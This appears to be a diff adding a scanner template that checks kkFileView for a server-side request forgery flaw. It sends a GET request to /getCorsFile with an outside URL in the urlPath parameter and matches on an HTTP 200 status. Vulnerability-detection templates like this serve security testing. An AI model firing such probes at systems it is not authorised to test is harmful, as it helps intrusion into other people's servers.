@@ -1,0 +1,18 @@
+id: yaml-poc-keking-kkfileview-ssrf-CT-484687
+info:
+  name: Yaml Poc Keking Kkfileview Ssrf Ct 484687
+  author: jiapeng.han
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-keking-kkfileview-ssrf-CT-484687'
+  tags: ssrf
+  reference:
+  - https://github.com/kekingcn/kkFileView/issues/128
+http:
+- method: GET
+  path:
+  - /getCorsFile?urlPath=http://example.com
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
